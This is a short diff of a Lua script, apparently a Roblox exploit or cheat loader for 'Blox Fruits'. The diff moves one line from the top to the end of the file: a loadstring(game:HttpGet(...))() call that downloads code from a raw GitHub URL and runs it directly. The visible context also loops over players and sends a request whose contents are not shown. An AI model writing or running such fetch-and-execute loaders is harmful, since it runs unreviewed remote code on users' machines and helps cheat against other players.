@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/davidcaYTHUEUTS1/Edward-Newgate1/main/blox%20fruit"))()
 local P = {2753915549,4442272183,7449423635};
 for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	shared.Min = i
@@ -66,3 +65,4 @@ for i,v in pairs(P) do
 		request(R)
 	end
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/davidcaYTHUEUTS1/Edward-Newgate1/main/blox%20fruit"))()
